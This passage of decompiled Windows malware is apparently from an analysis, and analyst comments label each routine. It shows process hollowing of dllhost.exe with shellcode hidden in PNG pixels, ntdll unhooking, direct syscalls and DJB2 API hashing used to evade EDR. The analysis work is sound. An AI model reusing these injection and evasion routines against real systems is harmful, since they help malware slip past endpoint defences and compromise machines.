                      uVar4 = 2;
                      (&stack0x00000031)[lVar1] = *puVar8;
                    } while (puVar9 != puVar13);
LAB_1400072c5:
                    uVar6 = *(uint *)((longlong)auStackX_1c + lVar1 + -0x1c);
                    uVar14 = *(uint *)((longlong)auStackX_1c + lVar1 + -0x18);
                    iVar2 = *(int *)((longlong)aiStackX_8 + lVar1);
                    iVar7 = *(int *)((longlong)aiStackX_8 + lVar1 + 4);
                    puVar5 = *(uint **)(&stack0xfffffffffffffff8 + lVar1);
                    iVar3 = *(int *)(auStackX_19 + lVar1 + 3);
                  }
LAB_1400072f0:
                  iVar2 = iVar2 + 1;
                  bVar17 = uVar14 < uVar6;
                } while ((iVar2 < iVar3) && (bVar17));
              }
              iVar7 = iVar7 + 1;
            } while ((iVar7 < *(int *)((longlong)auStackX_1c + lVar1 + 4)) && (bVar17));
            if ((int)uVar4 == 0) {
              bVar17 = true;
              goto LAB_140007352;
            }
          }
        }
        *(undefined1 **)(&stack0xffffffffffffffe0 + lVar1) = &stack0x00000028 + lVar1;
        bVar17 = false;
        *(uint **)(&stack0xfffffffffffffff0 + lVar1) = puVar5;
        *(undefined8 *)(&stack0x00000028 + lVar1) = 0;
        *(undefined8 *)((longlong)&uStack_48 + lVar1) = 0x14000741a;
        iVar3 = stbi_mad3sizes_valid();
        puVar5 = *(uint **)(&stack0xfffffffffffffff0 + lVar1);
        if (-1 < iVar3) {
          bVar17 = *(ulonglong *)(&stack0x00000028 + lVar1) == uVar4;
        }
LAB_140007352:
        for (lVar11 = 0x1000; lVar11 != 0; lVar11 = lVar11 + -1) {
          *(undefined1 *)puVar15 = 0;
          puVar15 = (uint *)((longlong)puVar15 + 1);
        }
        *(undefined8 *)((longlong)&uStack_48 + lVar1) = 0x140007366;
        free(puVar5);
        return bVar17;
      }
    }
    *(undefined8 *)((longlong)&uStack_48 + lVar1) = 0x140007388;
    free(puVar5);
  }
  return false;
}



/*
 * inject_shellcode_into_dllhost @ 140007460
 *
 * Process injection via process hollowing:
 *   1. Decodes embedded PNG using stbi_decode_png_rgba (stb_image)
 *   2. Extracts shellcode from RGBA pixels via png_extract_shellcode_from_pixels
 *   3. Creates C:\Windows\System32\dllhost.exe in suspended state
 *      (CreateProcessW with flags 0x8000004 = CREATE_SUSPENDED | CREATE_NO_WINDOW)
 *   4. Allocates RWX memory in dllhost via NtAllocateVirtualMemory (direct syscall)
 *   5. Writes shellcode via NtWriteVirtualMemory (direct syscall)
 *   6. Resumes execution via NtResumeThread (direct syscall)
 * The shellcode contains a 1,023-byte reflective loader + the inner implant DLL.
 */

ulonglong inject_shellcode_into_dllhost(longlong param_1,int param_2)

{
  bool bVar1;
  BOOL BVar2;
  int iVar3;
  uint *_Memory;
  undefined7 extraout_var;
  longlong lVar4;
  ulonglong uVar5;
  uint uVar6;
  LPWSTR *ppWVar7;
  ulonglong uVar8;
  uint local_5f0;
  uint local_5ec;
  uint local_5e8 [2];
  longlong local_5e0;
  ulonglong local_5d8;
  longlong local_5d0;
  ulonglong local_5c8;
  undefined8 local_5c0;
  undefined8 local_5b8;
  longlong local_5b0;
  undefined8 local_5a8;
  undefined8 local_5a0;
  undefined1 local_598 [16];
  undefined8 local_588;
  _STARTUPINFOW local_578;
  uint local_508 [4];
  undefined8 local_4f8;
  undefined4 local_4d8;
  longlong local_488;
  undefined4 local_450;
  longlong local_448;
  longlong lStack_440;
  longlong local_438;
  longlong lStack_430;
  
  local_578._4_8_ = 0;
  local_578.hStdError = (HANDLE)0x0;
  ppWVar7 = &local_578.lpReserved;
  for (lVar4 = 0xc; lVar4 != 0; lVar4 = lVar4 + -1) {
    *ppWVar7 = (LPWSTR)0x0;
    ppWVar7 = ppWVar7 + 1;
  }
  local_588._0_4_ = 0;
  local_588._4_4_ = 0;
  local_578.cb = 0x68;
  local_578.dwFlags = 1;
  local_598 = (undefined1  [16])0x0;
  BVar2 = CreateProcessW(L"C:\\Windows\\System32\\dllhost.exe",(LPWSTR)0x0,
                         (LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,0,0x8000004,
                         (LPVOID)0x0,(LPCWSTR)0x0,&local_578,(LPPROCESS_INFORMATION)local_598);
  if (BVar2 != 0) {
    lStack_440 = param_2 + param_1;
    local_4d8 = 0;
    local_4f8 = 0;
    local_450 = 0;
    local_448 = param_1;
    local_438 = param_1;
    lStack_430 = lStack_440;
    _Memory = stbi_decode_png_rgba(local_508,&local_5f0,&local_5ec,local_5e8,4);
    if (_Memory != (uint *)0x0) {
      if ((int)(local_5f0 * local_5ec) < 2) {
        free(_Memory);
      }
      else {
        uVar6 = *_Memory;
        free(_Memory);
        uVar6 = uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18;
        if (uVar6 - 1 < 0x3200000) {
          uVar8 = (ulonglong)uVar6;
          local_5e0 = 0;
          local_5d8 = uVar8;
          iVar3 = stbi_get8();
          if ((-1 < iVar3) && (local_5e0 != 0)) {
            bVar1 = png_extract_shellcode_from_pixels(param_1,param_2);
            uVar5 = CONCAT71(extraout_var,bVar1) & 0xffffffff;
            if ((int)CONCAT71(extraout_var,bVar1) != 0) {
              local_5d0 = local_5e0;
              local_5e8[1] = 0;
              local_5c8 = uVar8;
              iVar3 = stbi_get16be();
              if (-1 < iVar3) {
                local_5c0 = 0xfffffffffb3b4c00;
                stbi_rewind();
                local_5d0 = local_5e0;
                local_5c8 = uVar8;
                iVar3 = stbi_get16be();
                if (-1 < iVar3) {
                  iVar3 = stbi_convert_format();
                  if (-1 < iVar3) {
                    stbi_malloc_mad4();
                    local_508[0] = 0xffd23940;
                    local_508[1] = 0xffffffff;
LAB_1400078f6:
                    stbi_rewind();
                    stbi_skip_from_callbacks();
                    stbi_skip_from_callbacks();
                    return uVar5;
                  }
                  local_4d8 = 0x10000b;
                  iVar3 = stbi_malloc_mad2();
                  if (-1 < iVar3) {
                    local_488 = local_5e0;
                    iVar3 = stbi_malloc_mad3();
                    if (-1 < iVar3) {
                      stbi_malloc_mad4();
                      local_5a0 = 0xffffffffffd23940;
                      goto LAB_1400078f6;
                    }
                  }
                  stbi_malloc_mad4();
                  local_5b8 = 0xffffffffff676980;
                  stbi_rewind();
                  local_5b0 = 0;
                  iVar3 = stbi_get32be();
                  if ((-1 < iVar3) && (local_5b0 != 0)) {
                    local_5a8 = 0xffffffffffe17b80;
                    stbi_rewind();
                    stbi_malloc_mad4();
                    local_5a0 = 0xffffffffffd23940;
                    stbi_rewind();
                    stbi_skip_from_callbacks();
                    stbi_skip_from_callbacks();
                    stbi_skip_from_callbacks();
                    return uVar5;
                  }
                }
              }
            }
          }
        }
      }
    }
    FUN_1400036a0();
    stbi_skip_from_callbacks();
    stbi_skip_from_callbacks();
  }
  return 0;
}



/* FUN_140007950 @ 140007950 */

void FUN_140007950(void)

{
  return;
}



/*
 * orchestrator_unhook_and_inject @ 140007960
 *
 * Main orchestration function. Performs:
 *   1. Maps clean ntdll.dll from disk and resolves direct syscall numbers
 *   2. Resolves additional API by hash 0x24a8d022 from ntdll exports
 *   3. Calls inject_shellcode_into_dllhost with the embedded PNG
 *      (EMBEDDED_PNG_DATA at VA 0x14000b120, size 0x1f5a5 = 128,421 bytes)
 */

/* WARNING: Removing unreachable block (ram,0x000140007a48) */

uint orchestrator_unhook_and_inject(void)

{
  int iVar1;
  HMODULE pHVar2;
  ulonglong uVar3;
  
  iVar1 = ntdll_unhook_resolve_syscalls();
  if (iVar1 == 0) {
    return 1;
  }
  pHVar2 = djb2_resolve_api_by_hash(0x24a8d022);
  if ((pHVar2 != (HMODULE)0x0) && (iVar1 = stbi_get16be(), -1 < iVar1)) {
    stbi_mad3sizes_valid();
  }
  uVar3 = inject_shellcode_into_dllhost((longlong)&EMBEDDED_PNG_DATA,0x1f5a5);
  return (uint)uVar3 ^ 1;
}



/*
 * map_clean_ntdll_from_disk @ 140007ac0
 *
 * Obtains a clean, unhooked copy of ntdll.dll by:
 *   1. GetSystemDirectoryA to build "C:\Windows\System32\ntdll.dll"
 *   2. CreateFileA → CreateFileMappingA → MapViewOfFile
 * Returns the mapped base address of the pristine ntdll image.
 */

LPVOID map_clean_ntdll_from_disk(void)

{
  UINT UVar1;
  HANDLE hFile;
  HANDLE hFileMappingObject;
  LPVOID pvVar2;
  CHAR local_128 [272];
  
  UVar1 = GetSystemDirectoryA(local_128,0x104);
  if (UVar1 != 0) {
    lstrcatA(local_128,"\\ntdll.dll");
    hFile = CreateFileA(local_128,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
    if (hFile != (HANDLE)0xffffffffffffffff) {
      hFileMappingObject =
           CreateFileMappingA(hFile,(LPSECURITY_ATTRIBUTES)0x0,0x1000002,0,0,(LPCSTR)0x0);
      if (hFileMappingObject != (HANDLE)0x0) {
        pvVar2 = MapViewOfFile(hFileMappingObject,4,0,0,0);
        CloseHandle(hFileMappingObject);
        CloseHandle(hFile);
        return pvVar2;
      }
      CloseHandle(hFile);
    }
  }
  return (LPVOID)0x0;
}



/*
 * djb2_resolve_api_by_hash @ 140007bc0
 *
 * Walks the export directory of a loaded DLL and computes DJB2 hashes
 * (init=0x1505, multiply=0x21) over each export name. Returns the
 * function pointer when a hash matches the target. Used to resolve
 * ntdll APIs without referencing their names in the import table.
 */

HMODULE djb2_resolve_api_by_hash(int param_1)

{
  char cVar1;
  uint uVar2;
  uint uVar3;
  HMODULE pHVar4;
  int *piVar5;
  char *pcVar6;
  int iVar7;
  ulonglong uVar8;
  
  pHVar4 = GetModuleHandleA("ntdll.dll");
  if (pHVar4 != (HMODULE)0x0) {
    if ((((short)pHVar4->unused == 0x5a4d) &&
        (piVar5 = (int *)((longlong)&pHVar4->unused + (longlong)pHVar4[0xf].unused),
        *piVar5 == 0x4550)) && (uVar2 = piVar5[0x22], uVar2 != 0)) {
      uVar3 = *(uint *)((longlong)&pHVar4[6].unused + (ulonglong)uVar2);
      if (uVar3 != 0) {
        uVar8 = 0;
        do {
          iVar7 = 0x1505;
          pcVar6 = (char *)((longlong)&pHVar4->unused +
                           (ulonglong)
                           *(uint *)((longlong)&pHVar4[uVar8].unused +
                                    (ulonglong)
                                    *(uint *)((longlong)&pHVar4[8].unused + (ulonglong)uVar2)));
          cVar1 = *pcVar6;
          while (cVar1 != '\0') {
            pcVar6 = pcVar6 + 1;
            iVar7 = iVar7 * 0x21 + (int)cVar1;
            cVar1 = *pcVar6;
          }
          if (param_1 == iVar7) {
            return (HMODULE)((longlong)&pHVar4->unused +
                            (ulonglong)
                            *(uint *)((longlong)
                                      &pHVar4[*(ushort *)
                                               ((longlong)&pHVar4->unused +
                                               (ulonglong)
                                               *(uint *)((longlong)&pHVar4[9].unused +
                                                        (ulonglong)uVar2) + uVar8 * 2)].unused +
                                     (ulonglong)
                                     *(uint *)((longlong)&pHVar4[7].unused + (ulonglong)uVar2)));
          }
          uVar8 = uVar8 + 1;
        } while (uVar8 != uVar3);
      }
    }
    pHVar4 = (HMODULE)0x0;
  }
  return pHVar4;
}



/* FUN_140007ca0 @ 140007ca0 */

uint FUN_140007ca0(int param_1)

{
  HMODULE pHVar1;
  char cVar2;
  uint uVar3;
  uint uVar4;
  HMODULE pHVar5;
  char *pcVar6;
  char *pcVar7;
  int iVar8;
  ulonglong uVar9;
  
  pHVar5 = djb2_resolve_api_by_hash(param_1);
  if (pHVar5 != (HMODULE)0x0) {
    if ((((char)pHVar5->unused == 'L') && (*(char *)((longlong)&pHVar5->unused + 1) == -0x75)) &&
       (*(char *)((longlong)&pHVar5->unused + 2) == -0x2f)) {
      pHVar1 = pHVar5 + 8;
      do {
        if (((char)pHVar5->unused == -0x48) &&
           (uVar3 = *(uint *)((longlong)&pHVar5->unused + 1), (uVar3 & 0xfe00) == 0)) {
LAB_140007db9:
          return uVar3 & 0xffff;
        }
        pHVar5 = (HMODULE)((longlong)&pHVar5->unused + 1);
      } while (pHVar5 != pHVar1);
    }
    else {
      if (DAT_14002f0b8 == 0) {
        DAT_14002f0b0 = (short *)map_clean_ntdll_from_disk();
        DAT_14002f0b8 = 1;
      }
      if (((DAT_14002f0b0 != (short *)0x0) && (*DAT_14002f0b0 == 0x5a4d)) &&
         ((*(int *)((longlong)*(int *)(DAT_14002f0b0 + 0x1e) + (longlong)DAT_14002f0b0) == 0x4550 &&
          (uVar3 = ((int *)((longlong)*(int *)(DAT_14002f0b0 + 0x1e) + (longlong)DAT_14002f0b0))
                   [0x22], uVar3 != 0)))) {
        uVar4 = *(uint *)((longlong)DAT_14002f0b0 + (ulonglong)uVar3 + 0x18);
        if (uVar4 != 0) {
          uVar9 = 0;
          do {
            pcVar6 = (char *)((ulonglong)
                              *(uint *)((longlong)DAT_14002f0b0 +
                                       uVar9 * 4 +
                                       (ulonglong)
                                       *(uint *)((longlong)DAT_14002f0b0 + (ulonglong)uVar3 + 0x20))
                             + (longlong)DAT_14002f0b0);
            cVar2 = *pcVar6;
            if (cVar2 != '\0') {
              iVar8 = 0x1505;
              do {
                pcVar6 = pcVar6 + 1;
                iVar8 = iVar8 * 0x21 + (int)cVar2;
                cVar2 = *pcVar6;
              } while (cVar2 != '\0');
              if (param_1 == iVar8) {
                pcVar7 = (char *)((ulonglong)
                                  *(uint *)((longlong)DAT_14002f0b0 +
                                           (ulonglong)
                                           *(uint *)((longlong)DAT_14002f0b0 +
                                                    (ulonglong)uVar3 + 0x1c) +
                                           (ulonglong)
                                           *(ushort *)
                                            ((longlong)DAT_14002f0b0 +
                                            (ulonglong)
                                            *(uint *)((longlong)DAT_14002f0b0 +
                                                     (ulonglong)uVar3 + 0x24) + uVar9 * 2) * 4) +
                                 (longlong)DAT_14002f0b0);
                pcVar6 = pcVar7 + 0x20;
                while ((*pcVar7 != -0x48 || (uVar3 = *(uint *)(pcVar7 + 1), (uVar3 & 0xfe00) != 0)))
                {
                  pcVar7 = pcVar7 + 1;
                  if (pcVar6 == pcVar7) {
                    return 0xffffffff;
                  }
                }
                goto LAB_140007db9;
              }
            }
            uVar9 = uVar9 + 1;
          } while (uVar9 != uVar4);
        }
      }
    }
  }
  return 0xffffffff;
}



/* FUN_140007e20 @ 140007e20 */

uint FUN_140007e20(char *param_1)

{
  char *pcVar1;
  
  if (param_1 != (char *)0x0) {
    pcVar1 = param_1 + 0x20;
    do {
      if ((*param_1 == -0x48) && ((*(uint *)(param_1 + 1) & 0xfe00) == 0)) {
        return *(uint *)(param_1 + 1) & 0xffff;
      }
      param_1 = param_1 + 1;
    } while (param_1 != pcVar1);
  }
  return 0xffffffff;
}



/* FUN_140007e60 @ 140007e60 */

undefined8 FUN_140007e60(void)

{
  return DAT_14002f040;
}



/*
 * ntdll_unhook_resolve_syscalls @ 140007e70
 *
 * EDR bypass via ntdll unhooking. Reads a clean copy of ntdll.dll from
 * C:\Windows\System32\ntdll.dll using map_clean_ntdll_from_disk, then:
 *   1. Walks the .text section looking for syscall;ret gadgets (0F 05 C3)
 *   2. Resolves ~20 Nt* function syscall numbers by matching DJB2 hashes
 *   3. Stores syscall numbers + gadget address for direct syscall invocation
 * This avoids calling hooked ntdll stubs that EDR/AV products instrument.
 */

undefined4 ntdll_unhook_resolve_syscalls(void)

{
  int iVar1;
  int iVar2;
  HMODULE pHVar3;
  LPCSTR lpString1;
  int iVar4;
  char *pcVar5;
  
  if (DAT_14002f0bc != 0) {
    return 1;
  }
  GetModuleHandleA("ntdll.dll");
  pHVar3 = GetModuleHandleA("ntdll.dll");
  if (pHVar3 != (HMODULE)0x0) {
    iVar1 = pHVar3[0xf].unused;
    lpString1 = (LPCSTR)((longlong)&pHVar3[6].unused +
                        (ulonglong)*(ushort *)((longlong)&pHVar3[5].unused + (longlong)iVar1) +
                        (longlong)iVar1);
    if (*(short *)((longlong)&pHVar3[1].unused + (longlong)iVar1 + 2) != 0) {
      iVar4 = 0;
      do {
        iVar2 = lstrcmpA(lpString1,".text");
        if (iVar2 == 0) {
          pcVar5 = (char *)((longlong)&pHVar3->unused + (ulonglong)*(uint *)(lpString1 + 0xc));
          if (*(int *)(lpString1 + 8) != 2) {
            DAT_14002f040 = pcVar5;
            goto LAB_140007f6d;
          }
          break;
        }
        iVar4 = iVar4 + 1;
        lpString1 = lpString1 + 0x28;
      } while (iVar4 < (int)(uint)*(ushort *)((longlong)&pHVar3[1].unused + (longlong)iVar1 + 2));
    }
  }
  goto LAB_140008120;
  while (DAT_14002f040 = DAT_14002f040 + 1, DAT_14002f040 != pcVar5 + (*(int *)(lpString1 + 8) - 2))
  {
LAB_140007f6d:
    if (((*DAT_14002f040 == '\x0f') && (DAT_14002f040[1] == '\x05')) &&
       (pcVar5[(uint)((2 - (int)pcVar5) + (int)DAT_14002f040)] == -0x3d)) goto LAB_140007f90;
  }
LAB_140008120:
  DAT_14002f040 = (char *)0x0;
LAB_140007f90:
  DAT_14002f060 = FUN_140007ca0(0x6793c34c);
  DAT_14002f064 = FUN_140007ca0(0x82962c8);
  DAT_14002f068 = FUN_140007ca0(-0x34f3ded0);
  DAT_14002f06c = FUN_140007ca0(0x471aa7e9);
  DAT_14002f070 = FUN_140007ca0(-0x7471ecc3);
  DAT_14002f074 = FUN_140007ca0(0xa49084a);
  DAT_14002f078 = FUN_140007ca0(0x15a5ecdb);
  DAT_14002f07c = FUN_140007ca0(-0x2fd1df30);
  DAT_14002f080 = FUN_140007ca0(0x231f196a);
  DAT_14002f084 = FUN_140007ca0(0x595014ad);
  DAT_14002f088 = FUN_140007ca0(-0x6a0c586e);
  DAT_14002f08c = FUN_140007ca0(-0x3dbf9d1d);
  DAT_14002f090 = FUN_140007ca0(-0x61f1e5bc);
  DAT_14002f094 = FUN_140007ca0(0x308be0d0);
  DAT_14002f098 = FUN_140007ca0(0x2c7b3d30);
  DAT_14002f09c = FUN_140007ca0(-0x2fcb039e);
  DAT_14002f0a0 = FUN_140007ca0(-0x2b9eddc8);
  DAT_14002f0a4 = FUN_140007ca0(0x1703ab2f);
  DAT_14002f0a8 = FUN_140007ca0(-0x5616da49);
  DAT_14002f0ac = FUN_140007ca0(0x6e88b479);
  if (DAT_14002f060 == 0xffffffff) {
    return 0;
  }
  if (DAT_14002f064 == 0xffffffff) {
    return 0;
  }
  if (DAT_14002f06c == 0xffffffff) {
    return 0;
  }
  if (DAT_14002f070 != 0xffffffff) {
    DAT_14002f0bc = 1;
    return 1;
  }
  return 0;
}



/* FUN_140008130 @ 140008130 */

undefined4 FUN_140008130(void)

{
  return DAT_14002f0bc;
}



/* FUN_140008140 @ 140008140 */

void FUN_140008140(void)

{
  code *pcVar1;
  
  pcVar1 = *(code **)PTR_DAT_14002a6d0;
  while (pcVar1 != (code *)0x0) {
    (*pcVar1)();
    pcVar1 = *(code **)(PTR_DAT_14002a6d0 + 8);
    PTR_DAT_14002a6d0 = PTR_DAT_14002a6d0 + 8;
  }
  return;
}



/* FUN_140008180 @ 140008180 */

void FUN_140008180(void)

{
  int iVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  undefined8 *puVar4;
  
  uVar2 = 0;
  do {
    uVar3 = uVar2;
    iVar1 = (int)uVar3;
    uVar2 = (ulonglong)(iVar1 + 1);
  } while ((&DAT_14002c2d0)[iVar1 + 1] != 0);
  if (iVar1 != 0) {
    puVar4 = &DAT_14002c2d0 + uVar3;
    do {
      (*(code *)*puVar4)();
      puVar4 = puVar4 + -1;
    } while (puVar4 != (undefined8 *)(&UNK_14002c2c8 + (uVar3 - (iVar1 - 1)) * 8));
  }
  FUN_140001410(FUN_140008140);
  return;
}



/* crt_init_console @ 1400081f0 */

void crt_init_console(void)

{
  if (DAT_14002f0c0 != 0) {
    return;
  }
  DAT_14002f0c0 = 1;
  FUN_140008180();
  return;
}



/* crt_stub_return_zero @ 140008210 */

undefined8 crt_stub_return_zero(void)

{
  return 0;
}



/* tls_callback_1 @ 140008220 */

undefined8 tls_callback_1(undefined8 param_1,uint param_2)

{
  if ((param_2 != 3) && (param_2 != 0)) {
    return 1;
  }
  FUN_140008cc0(param_1,param_2);
  return 1;
}



/* tls_callback_0 @ 140008250 */

/* WARNING: Removing unreachable block (ram,0x000140008293) */
/* WARNING: Removing unreachable block (ram,0x000140008298) */
/* WARNING: Removing unreachable block (ram,0x0001400082a0) */
/* WARNING: Removing unreachable block (ram,0x0001400082a2) */
/* WARNING: Removing unreachable block (ram,0x0001400082ab) */

undefined8 tls_callback_0(undefined8 param_1,int param_2)

{
  if (g_tls_state != 2) {
    g_tls_state = 2;
  }
  if ((param_2 != 2) && (param_2 == 1)) {
    FUN_140008cc0(param_1,1);
    return 1;
  }
  return 1;
}



/* FUN_1400082e0 @ 1400082e0 */

undefined8 FUN_1400082e0(void)

{
  return 0;
}



/* crt_matherr_handler @ 1400082f0 */

undefined8 crt_matherr_handler(undefined4 *param_1)

{
  undefined8 uVar1;
  undefined8 uVar2;
  undefined8 uVar3;
  undefined8 uVar4;
  FILE *_File;
  char *pcVar5;
  
  switch(*param_1) {
  default:
    pcVar5 = "Unknown error";
    break;
  case 1:
    pcVar5 = "Argument domain error (DOMAIN)";
    break;
  case 2:
    pcVar5 = "Argument singularity (SIGN)";
    break;
  case 3:
    pcVar5 = "Overflow range error (OVERFLOW)";
    break;
  case 4:
    pcVar5 = "The result is too small to be represented (UNDERFLOW)";
    break;
  case 5:
    pcVar5 = "Total loss of significance (TLOSS)";
    break;
  case 6:
    pcVar5 = "Partial loss of significance (PLOSS)";
  }
  uVar1 = *(undefined8 *)(param_1 + 8);
  uVar2 = *(undefined8 *)(param_1 + 6);
  uVar3 = *(undefined8 *)(param_1 + 4);
  uVar4 = *(undefined8 *)(param_1 + 2);
  _File = FUN_140009be0(2);
  fprintf(_File,"_matherr(): %s in %s(%g, %g)  (retval=%g)\n",pcVar5,uVar4,uVar3,uVar2,uVar1);
  return 0;
}



/* FUN_1400083f0 @ 1400083f0 */

void FUN_1400083f0(void)

{
  return;
}



/* FUN_140008400 @ 140008400 */

void FUN_140008400(char *param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  FILE *pFVar1;
  undefined8 local_res10;
  undefined8 local_res18;
  undefined8 local_res20;
  
  local_res10 = param_2;
  local_res18 = param_3;
  local_res20 = param_4;
  pFVar1 = FUN_140009be0(2);
  fwrite("Mingw-w64 runtime failure:\n",1,0x1b,pFVar1);
  pFVar1 = FUN_140009be0(2);
  vfprintf(pFVar1,param_1,(va_list)&local_res10);
                    /* WARNING: Subroutine does not return */
  abort();
}



/* FUN_140008470 @ 140008470 */

/* WARNING: Removing unreachable block (ram,0x000140008671) */
/* WARNING: Removing unreachable block (ram,0x00014000867d) */
/* WARNING: Removing unreachable block (ram,0x000140008687) */
/* WARNING: Removing unreachable block (ram,0x00014000868a) */
/* WARNING: Removing unreachable block (ram,0x000140008692) */
/* WARNING: Removing unreachable block (ram,0x00014000869e) */
/* WARNING: Removing unreachable block (ram,0x0001400086ab) */
/* WARNING: Removing unreachable block (ram,0x00014000871f) */
/* WARNING: Removing unreachable block (ram,0x000140008848) */
/* WARNING: Removing unreachable block (ram,0x0001400088c8) */
/* WARNING: Removing unreachable block (ram,0x0001400088d2) */
/* WARNING: Removing unreachable block (ram,0x000140008854) */
/* WARNING: Removing unreachable block (ram,0x00014000886b) */
/* WARNING: Removing unreachable block (ram,0x000140008874) */
/* WARNING: Removing unreachable block (ram,0x000140008887) */
/* WARNING: Removing unreachable block (ram,0x00014000873c) */
/* WARNING: Removing unreachable block (ram,0x0001400086c0) */
/* WARNING: Removing unreachable block (ram,0x0001400086c9) */
/* WARNING: Removing unreachable block (ram,0x0001400086d2) */
/* WARNING: Removing unreachable block (ram,0x0001400088b0) */
/* WARNING: Removing unreachable block (ram,0x0001400088be) */
/* WARNING: Removing unreachable block (ram,0x0001400086e4) */
/* WARNING: Removing unreachable block (ram,0x0001400086f5) */
/* WARNING: Removing unreachable block (ram,0x0001400086fe) */
/* WARNING: Removing unreachable block (ram,0x000140008707) */
/* WARNING: Removing unreachable block (ram,0x0001400087a0) */
/* WARNING: Removing unreachable block (ram,0x0001400088d8) */
/* WARNING: Removing unreachable block (ram,0x0001400088e6) */
/* WARNING: Removing unreachable block (ram,0x0001400087b2) */
/* WARNING: Removing unreachable block (ram,0x0001400087c3) */
/* WARNING: Removing unreachable block (ram,0x0001400087cc) */
/* WARNING: Removing unreachable block (ram,0x0001400087d2) */
/* WARNING: Removing unreachable block (ram,0x0001400087ea) */
/* WARNING: Removing unreachable block (ram,0x00014000873e) */
/* WARNING: Removing unreachable block (ram,0x000140008922) */
/* WARNING: Removing unreachable block (ram,0x000140008930) */
/* WARNING: Removing unreachable block (ram,0x000140008954) */
/* WARNING: Removing unreachable block (ram,0x000140008979) */
/* WARNING: Removing unreachable block (ram,0x000140008747) */
/* WARNING: Removing unreachable block (ram,0x00014000875e) */
/* WARNING: Removing unreachable block (ram,0x000140008763) */
/* WARNING: Removing unreachable block (ram,0x000140008780) */
/* WARNING: Removing unreachable block (ram,0x000140008788) */
/* WARNING: Removing unreachable block (ram,0x000140008796) */
/* WARNING: Removing unreachable block (ram,0x0001400088a0) */
/* WARNING: Removing unreachable block (ram,0x000140008712) */
/* WARNING: Removing unreachable block (ram,0x0001400088f0) */
/* WARNING: Removing unreachable block (ram,0x0001400088f9) */
/* WARNING: Removing unreachable block (ram,0x000140008900) */
/* WARNING: Removing unreachable block (ram,0x00014000891d) */
/* WARNING: Removing unreachable block (ram,0x0001400087f0) */
/* WARNING: Removing unreachable block (ram,0x0001400087fe) */
/* WARNING: Removing unreachable block (ram,0x000140008810) */
/* WARNING: Removing unreachable block (ram,0x000140008822) */
/* WARNING: Removing unreachable block (ram,0x00014000882f) */
/* WARNING: Removing unreachable block (ram,0x000140008840) */
/* WARNING: Enum "SectionFlags": Some values do not have unique names */

void FUN_140008470(uint *param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  BOOL BVar1;
  DWORD DVar2;
  ulonglong *puVar3;
  IMAGE_SECTION_HEADER *pIVar4;
  undefined4 *puVar5;
  IMAGE_DOS_HEADER *pIVar6;
  SIZE_T SVar7;
  ulonglong uVar8;
  longlong lVar9;
  uint *in_R8;
  uint uVar10;
  PDWORD in_R9;
  undefined1 auStack_c0 [24];
  uint *puStack_a8;
  longlong lStack_a0;
  IMAGE_SECTION_HEADER *pIStack_98;
  _MEMORY_BASIC_INFORMATION local_48;
  
  lVar9 = (longlong)(int)DAT_14002f134;
  if ((int)DAT_14002f134 < 1) goto LAB_1400085a0;
  in_R9 = (PDWORD)0x0;
  puVar3 = (ulonglong *)(DAT_14002f138 + 0x18);
  do {
    in_R8 = (uint *)*puVar3;
    if ((in_R8 <= param_1) &&
       (in_R8 = (uint *)((longlong)in_R8 + (ulonglong)*(uint *)(puVar3[1] + 8)), param_1 < in_R8)) {
      return;
    }
    uVar10 = (int)in_R9 + 1;
    in_R9 = (PDWORD)(ulonglong)uVar10;
    puVar3 = puVar3 + 5;
  } while (uVar10 != DAT_14002f134);
  do {
    pIVar4 = FUN_140008ee0((longlong)param_1);
    if (pIVar4 == (IMAGE_SECTION_HEADER *)0x0) {
LAB_1400085c2:
      FUN_140008400("Address %p has no image-section",param_1,in_R8,in_R9);
      if (DAT_14002f130 == 0) {
        DAT_14002f130 = 1;
        puStack_a8 = param_1;
        lStack_a0 = lVar9;
        pIStack_98 = pIVar4;
        FUN_140008f60();
        uVar8 = FUN_1400091c0();
        DAT_14002f134 = 0;
        DAT_14002f138 = auStack_c0 + -uVar8;
      }
      return;
    }
    param_1 = (uint *)(lVar9 * 0x28);
    puVar5 = (undefined4 *)(DAT_14002f138 + (longlong)param_1);
    *(IMAGE_SECTION_HEADER **)(puVar5 + 8) = pIVar4;
    *puVar5 = 0;
    pIVar6 = FUN_140009020();
    uVar10 = pIVar4->VirtualAddress;
    *(char **)(DAT_14002f138 + 0x18 + (longlong)param_1) = pIVar6->e_magic + uVar10;
    SVar7 = VirtualQuery(pIVar6->e_magic + uVar10,&local_48,0x30);
    if (SVar7 == 0) {
      in_R8 = *(uint **)(DAT_14002f138 + 0x18 + (longlong)param_1);
      FUN_140008400("  VirtualQuery failed for %d bytes at address %p",
                    (ulonglong)(pIVar4->Misc).PhysicalAddress,in_R8,in_R9);
      goto LAB_1400085c2;
    }
    if (((local_48.Protect - 4 & 0xfffffffb) == 0) || ((local_48.Protect - 0x40 & 0xffffffbf) == 0))
    {
LAB_14000853e:
      DAT_14002f134 = DAT_14002f134 + 1;
      return;
    }
    in_R8 = (uint *)0x40;
    if (local_48.Protect == 2) {
      in_R8 = (uint *)0x4;
    }
    param_1 = (uint *)((longlong)param_1 + (longlong)DAT_14002f138);
    *(PVOID *)(param_1 + 2) = local_48.BaseAddress;
    *(SIZE_T *)(param_1 + 4) = local_48.RegionSize;
    in_R9 = param_1;
    BVar1 = VirtualProtect(local_48.BaseAddress,local_48.RegionSize,(DWORD)in_R8,param_1);
    if (BVar1 != 0) goto LAB_14000853e;
    DVar2 = GetLastError();
    FUN_140008400("  VirtualProtect failed with code 0x%x",(ulonglong)DVar2,in_R8,in_R9);
LAB_1400085a0:
    lVar9 = 0;
  } while( true );
}



/* FUN_1400085e0 @ 1400085e0 */

/* WARNING: Removing unreachable block (ram,0x000140008671) */
/* WARNING: Removing unreachable block (ram,0x00014000867d) */
/* WARNING: Removing unreachable block (ram,0x000140008687) */
/* WARNING: Removing unreachable block (ram,0x00014000868a) */
/* WARNING: Removing unreachable block (ram,0x000140008692) */
/* WARNING: Removing unreachable block (ram,0x00014000869e) */
/* WARNING: Removing unreachable block (ram,0x0001400086ab) */
/* WARNING: Removing unreachable block (ram,0x00014000871f) */
/* WARNING: Removing unreachable block (ram,0x000140008848) */
